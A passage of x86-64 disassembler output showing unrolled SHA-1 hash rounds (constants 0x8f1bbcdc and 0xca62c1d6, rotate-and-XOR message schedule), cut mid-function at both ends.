  4060d0:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4060d7:	48 89 d6             	mov    %rdx,%rsi
  4060da:	48 21 c6             	and    %rax,%rsi
  4060dd:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4060e4:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4060eb:	48 09 d0             	or     %rdx,%rax
  4060ee:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  4060f5:	48 09 f0             	or     %rsi,%rax
  4060f8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4060fc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406103:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406107:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40610e:	89 c0                	mov    %eax,%eax
  406110:	48 c1 e8 1f          	shr    $0x1f,%rax
  406114:	48 09 c8             	or     %rcx,%rax
  406117:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  40611b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40611f:	48 01 c2             	add    %rax,%rdx
  406122:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406129:	48 01 c2             	add    %rax,%rdx
  40612c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  406131:	48 01 d0             	add    %rdx,%rax
  406134:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  40613b:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406142:	48 c1 e0 1e          	shl    $0x1e,%rax
  406146:	48 89 c2             	mov    %rax,%rdx
  406149:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406150:	89 c0                	mov    %eax,%eax
  406152:	48 c1 e8 02          	shr    $0x2,%rax
  406156:	48 09 d0             	or     %rdx,%rax
  406159:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  406160:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  406164:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  406168:	48 31 c2             	xor    %rax,%rdx
  40616b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40616f:	48 31 c2             	xor    %rax,%rdx
  406172:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  406176:	48 31 d0             	xor    %rdx,%rax
  406179:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406180:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406187:	48 c1 e0 05          	shl    $0x5,%rax
  40618b:	48 89 c2             	mov    %rax,%rdx
  40618e:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406195:	89 c0                	mov    %eax,%eax
  406197:	48 c1 e8 1b          	shr    $0x1b,%rax
  40619b:	48 89 d1             	mov    %rdx,%rcx
  40619e:	48 09 c1             	or     %rax,%rcx
  4061a1:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4061a8:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4061af:	48 89 d6             	mov    %rdx,%rsi
  4061b2:	48 21 c6             	and    %rax,%rsi
  4061b5:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4061bc:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4061c3:	48 09 d0             	or     %rdx,%rax
  4061c6:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  4061cd:	48 09 f0             	or     %rsi,%rax
  4061d0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4061d4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4061db:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4061df:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4061e6:	89 c0                	mov    %eax,%eax
  4061e8:	48 c1 e8 1f          	shr    $0x1f,%rax
  4061ec:	48 09 c8             	or     %rcx,%rax
  4061ef:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  4061f3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4061f7:	48 01 c2             	add    %rax,%rdx
  4061fa:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406201:	48 01 c2             	add    %rax,%rdx
  406204:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  406209:	48 01 d0             	add    %rdx,%rax
  40620c:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  406213:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40621a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40621e:	48 89 c2             	mov    %rax,%rdx
  406221:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406228:	89 c0                	mov    %eax,%eax
  40622a:	48 c1 e8 02          	shr    $0x2,%rax
  40622e:	48 09 d0             	or     %rdx,%rax
  406231:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  406238:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  40623c:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  406240:	48 31 c2             	xor    %rax,%rdx
  406243:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  406247:	48 31 c2             	xor    %rax,%rdx
  40624a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40624e:	48 31 d0             	xor    %rdx,%rax
  406251:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406258:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40625f:	48 c1 e0 05          	shl    $0x5,%rax
  406263:	48 89 c2             	mov    %rax,%rdx
  406266:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40626d:	89 c0                	mov    %eax,%eax
  40626f:	48 c1 e8 1b          	shr    $0x1b,%rax
  406273:	48 89 d1             	mov    %rdx,%rcx
  406276:	48 09 c1             	or     %rax,%rcx
  406279:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406280:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  406287:	48 31 d0             	xor    %rdx,%rax
  40628a:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  406291:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406295:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40629c:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4062a0:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4062a7:	89 c0                	mov    %eax,%eax
  4062a9:	48 c1 e8 1f          	shr    $0x1f,%rax
  4062ad:	48 09 c8             	or     %rcx,%rax
  4062b0:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4062b4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4062b8:	48 01 c2             	add    %rax,%rdx
  4062bb:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4062c2:	48 01 c2             	add    %rax,%rdx
  4062c5:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  4062ca:	48 01 d0             	add    %rdx,%rax
  4062cd:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4062d4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4062db:	48 c1 e0 1e          	shl    $0x1e,%rax
  4062df:	48 89 c2             	mov    %rax,%rdx
  4062e2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4062e9:	89 c0                	mov    %eax,%eax
  4062eb:	48 c1 e8 02          	shr    $0x2,%rax
  4062ef:	48 09 d0             	or     %rdx,%rax
  4062f2:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4062f9:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  4062fd:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  406301:	48 31 c2             	xor    %rax,%rdx
  406304:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  406308:	48 31 c2             	xor    %rax,%rdx
  40630b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40630f:	48 31 d0             	xor    %rdx,%rax
  406312:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406319:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406320:	48 c1 e0 05          	shl    $0x5,%rax
  406324:	48 89 c2             	mov    %rax,%rdx
  406327:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40632e:	89 c0                	mov    %eax,%eax
  406330:	48 c1 e8 1b          	shr    $0x1b,%rax
  406334:	48 89 d1             	mov    %rdx,%rcx
  406337:	48 09 c1             	or     %rax,%rcx
  40633a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406341:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  406348:	48 31 d0             	xor    %rdx,%rax
  40634b:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  406352:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406356:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40635d:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406361:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406368:	89 c0                	mov    %eax,%eax
  40636a:	48 c1 e8 1f          	shr    $0x1f,%rax
  40636e:	48 09 c8             	or     %rcx,%rax
  406371:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  406375:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  406379:	48 01 c2             	add    %rax,%rdx
  40637c:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406383:	48 01 c2             	add    %rax,%rdx
  406386:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  40638b:	48 01 d0             	add    %rdx,%rax
  40638e:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  406395:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40639c:	48 c1 e0 1e          	shl    $0x1e,%rax
  4063a0:	48 89 c2             	mov    %rax,%rdx
  4063a3:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4063aa:	89 c0                	mov    %eax,%eax
  4063ac:	48 c1 e8 02          	shr    $0x2,%rax
  4063b0:	48 09 d0             	or     %rdx,%rax
  4063b3:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4063ba:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  4063be:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  4063c2:	48 31 c2             	xor    %rax,%rdx
  4063c5:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4063c9:	48 31 c2             	xor    %rax,%rdx
  4063cc:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4063d0:	48 31 d0             	xor    %rdx,%rax
  4063d3:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4063da:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4063e1:	48 c1 e0 05          	shl    $0x5,%rax
  4063e5:	48 89 c2             	mov    %rax,%rdx
  4063e8:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4063ef:	89 c0                	mov    %eax,%eax
  4063f1:	48 c1 e8 1b          	shr    $0x1b,%rax
  4063f5:	48 89 d1             	mov    %rdx,%rcx
  4063f8:	48 09 c1             	or     %rax,%rcx
  4063fb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406402:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  406409:	48 31 d0             	xor    %rdx,%rax
  40640c:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  406413:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406417:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40641e:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406422:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406429:	89 c0                	mov    %eax,%eax
  40642b:	48 c1 e8 1f          	shr    $0x1f,%rax
  40642f:	48 09 c8             	or     %rcx,%rax
  406432:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  406436:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40643a:	48 01 c2             	add    %rax,%rdx
  40643d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406444:	48 01 c2             	add    %rax,%rdx
  406447:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  40644c:	48 01 d0             	add    %rdx,%rax
  40644f:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  406456:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40645d:	48 c1 e0 1e          	shl    $0x1e,%rax
  406461:	48 89 c2             	mov    %rax,%rdx
  406464:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40646b:	89 c0                	mov    %eax,%eax
  40646d:	48 c1 e8 02          	shr    $0x2,%rax
  406471:	48 09 d0             	or     %rdx,%rax
  406474:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  40647b:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  40647f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  406483:	48 31 c2             	xor    %rax,%rdx
  406486:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40648a:	48 31 c2             	xor    %rax,%rdx
  40648d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  406491:	48 31 d0             	xor    %rdx,%rax
  406494:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40649b:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4064a2:	48 c1 e0 05          	shl    $0x5,%rax
  4064a6:	48 89 c2             	mov    %rax,%rdx
  4064a9:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4064b0:	89 c0                	mov    %eax,%eax
  4064b2:	48 c1 e8 1b          	shr    $0x1b,%rax
  4064b6:	48 89 d1             	mov    %rdx,%rcx
  4064b9:	48 09 c1             	or     %rax,%rcx
  4064bc:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4064c3:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4064ca:	48 31 d0             	xor    %rdx,%rax
  4064cd:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  4064d4:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4064d8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4064df:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4064e3:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4064ea:	89 c0                	mov    %eax,%eax
  4064ec:	48 c1 e8 1f          	shr    $0x1f,%rax
  4064f0:	48 09 c8             	or     %rcx,%rax
  4064f3:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4064f7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4064fb:	48 01 c2             	add    %rax,%rdx
  4064fe:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406505:	48 01 c2             	add    %rax,%rdx
  406508:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  40650d:	48 01 d0             	add    %rdx,%rax
  406510:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  406517:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40651e:	48 c1 e0 1e          	shl    $0x1e,%rax
  406522:	48 89 c2             	mov    %rax,%rdx
  406525:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40652c:	89 c0                	mov    %eax,%eax
  40652e:	48 c1 e8 02          	shr    $0x2,%rax
  406532:	48 09 d0             	or     %rdx,%rax
  406535:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  40653c:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  406540:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  406544:	48 31 c2             	xor    %rax,%rdx
  406547:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  40654b:	48 31 c2             	xor    %rax,%rdx
  40654e:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  406552:	48 31 d0             	xor    %rdx,%rax
  406555:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40655c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406563:	48 c1 e0 05          	shl    $0x5,%rax
  406567:	48 89 c2             	mov    %rax,%rdx
  40656a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406571:	89 c0                	mov    %eax,%eax
  406573:	48 c1 e8 1b          	shr    $0x1b,%rax
  406577:	48 89 d1             	mov    %rdx,%rcx
  40657a:	48 09 c1             	or     %rax,%rcx
  40657d:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406584:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  40658b:	48 31 d0             	xor    %rdx,%rax
  40658e:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  406595:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406599:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4065a0:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4065a4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4065ab:	89 c0                	mov    %eax,%eax
  4065ad:	48 c1 e8 1f          	shr    $0x1f,%rax
  4065b1:	48 09 c8             	or     %rcx,%rax
  4065b4:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4065b8:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4065bc:	48 01 c2             	add    %rax,%rdx
  4065bf:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4065c6:	48 01 c2             	add    %rax,%rdx
  4065c9:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  4065ce:	48 01 d0             	add    %rdx,%rax
  4065d1:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4065d8:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4065df:	48 c1 e0 1e          	shl    $0x1e,%rax
  4065e3:	48 89 c2             	mov    %rax,%rdx
  4065e6:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4065ed:	89 c0                	mov    %eax,%eax
  4065ef:	48 c1 e8 02          	shr    $0x2,%rax
  4065f3:	48 09 d0             	or     %rdx,%rax
  4065f6:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4065fd:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  406601:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  406605:	48 31 c2             	xor    %rax,%rdx
  406608:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  40660c:	48 31 c2             	xor    %rax,%rdx
  40660f:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  406613:	48 31 d0             	xor    %rdx,%rax
  406616:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40661d:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406624:	48 c1 e0 05          	shl    $0x5,%rax
  406628:	48 89 c2             	mov    %rax,%rdx
  40662b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406632:	89 c0                	mov    %eax,%eax
  406634:	48 c1 e8 1b          	shr    $0x1b,%rax
  406638:	48 89 d1             	mov    %rdx,%rcx
  40663b:	48 09 c1             	or     %rax,%rcx
  40663e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406645:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  40664c:	48 31 d0             	xor    %rdx,%rax
  40664f:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  406656:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40665a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406661:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406665:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40666c:	89 c0                	mov    %eax,%eax
  40666e:	48 c1 e8 1f          	shr    $0x1f,%rax
  406672:	48 09 c8             	or     %rcx,%rax
  406675:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  406679:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40667d:	48 01 c2             	add    %rax,%rdx
  406680:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406687:	48 01 c2             	add    %rax,%rdx
  40668a:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  40668f:	48 01 d0             	add    %rdx,%rax
  406692:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406699:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4066a0:	48 c1 e0 1e          	shl    $0x1e,%rax
  4066a4:	48 89 c2             	mov    %rax,%rdx
  4066a7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4066ae:	89 c0                	mov    %eax,%eax
  4066b0:	48 c1 e8 02          	shr    $0x2,%rax
  4066b4:	48 09 d0             	or     %rdx,%rax
  4066b7:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4066be:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4066c2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4066c6:	48 31 c2             	xor    %rax,%rdx
  4066c9:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4066cd:	48 31 c2             	xor    %rax,%rdx
  4066d0:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4066d4:	48 31 d0             	xor    %rdx,%rax
  4066d7:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4066de:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4066e5:	48 c1 e0 05          	shl    $0x5,%rax
  4066e9:	48 89 c2             	mov    %rax,%rdx
  4066ec:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4066f3:	89 c0                	mov    %eax,%eax
  4066f5:	48 c1 e8 1b          	shr    $0x1b,%rax
  4066f9:	48 89 d1             	mov    %rdx,%rcx
  4066fc:	48 09 c1             	or     %rax,%rcx
  4066ff:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406706:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  40670d:	48 31 d0             	xor    %rdx,%rax
  406710:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  406717:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40671b:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406722:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406726:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40672d:	89 c0                	mov    %eax,%eax
  40672f:	48 c1 e8 1f          	shr    $0x1f,%rax
  406733:	48 09 c8             	or     %rcx,%rax
  406736:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  40673a:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  40673e:	48 01 c2             	add    %rax,%rdx
  406741:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406748:	48 01 c2             	add    %rax,%rdx
  40674b:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406750:	48 01 d0             	add    %rdx,%rax
  406753:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  40675a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406761:	48 c1 e0 1e          	shl    $0x1e,%rax
  406765:	48 89 c2             	mov    %rax,%rdx
  406768:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40676f:	89 c0                	mov    %eax,%eax
  406771:	48 c1 e8 02          	shr    $0x2,%rax
  406775:	48 09 d0             	or     %rdx,%rax
  406778:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40677f:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  406783:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  406787:	48 31 c2             	xor    %rax,%rdx
  40678a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  40678e:	48 31 c2             	xor    %rax,%rdx
  406791:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  406795:	48 31 d0             	xor    %rdx,%rax
  406798:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40679f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4067a6:	48 c1 e0 05          	shl    $0x5,%rax
  4067aa:	48 89 c2             	mov    %rax,%rdx
  4067ad:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4067b4:	89 c0                	mov    %eax,%eax
  4067b6:	48 c1 e8 1b          	shr    $0x1b,%rax
  4067ba:	48 89 d1             	mov    %rdx,%rcx
  4067bd:	48 09 c1             	or     %rax,%rcx
  4067c0:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4067c7:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4067ce:	48 31 d0             	xor    %rdx,%rax
  4067d1:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  4067d8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4067dc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4067e3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4067e7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4067ee:	89 c0                	mov    %eax,%eax
  4067f0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4067f4:	48 09 c8             	or     %rcx,%rax
  4067f7:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  4067fb:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4067ff:	48 01 c2             	add    %rax,%rdx
  406802:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406809:	48 01 c2             	add    %rax,%rdx
  40680c:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406811:	48 01 d0             	add    %rdx,%rax
  406814:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40681b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406822:	48 c1 e0 1e          	shl    $0x1e,%rax
  406826:	48 89 c2             	mov    %rax,%rdx
  406829:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406830:	89 c0                	mov    %eax,%eax
  406832:	48 c1 e8 02          	shr    $0x2,%rax
  406836:	48 09 d0             	or     %rdx,%rax
  406839:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406840:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  406844:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  406848:	48 31 c2             	xor    %rax,%rdx
  40684b:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40684f:	48 31 c2             	xor    %rax,%rdx
  406852:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  406856:	48 31 d0             	xor    %rdx,%rax
  406859:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406860:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406867:	48 c1 e0 05          	shl    $0x5,%rax
  40686b:	48 89 c2             	mov    %rax,%rdx
  40686e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406875:	89 c0                	mov    %eax,%eax
  406877:	48 c1 e8 1b          	shr    $0x1b,%rax
  40687b:	48 89 d1             	mov    %rdx,%rcx
  40687e:	48 09 c1             	or     %rax,%rcx
  406881:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406888:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40688f:	48 31 d0             	xor    %rdx,%rax
  406892:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  406899:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40689d:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4068a4:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4068a8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4068af:	89 c0                	mov    %eax,%eax
  4068b1:	48 c1 e8 1f          	shr    $0x1f,%rax
  4068b5:	48 09 c8             	or     %rcx,%rax
  4068b8:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  4068bc:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4068c0:	48 01 c2             	add    %rax,%rdx
  4068c3:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4068ca:	48 01 c2             	add    %rax,%rdx
  4068cd:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  4068d2:	48 01 d0             	add    %rdx,%rax
  4068d5:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4068dc:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4068e3:	48 c1 e0 1e          	shl    $0x1e,%rax
  4068e7:	48 89 c2             	mov    %rax,%rdx
  4068ea:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4068f1:	89 c0                	mov    %eax,%eax
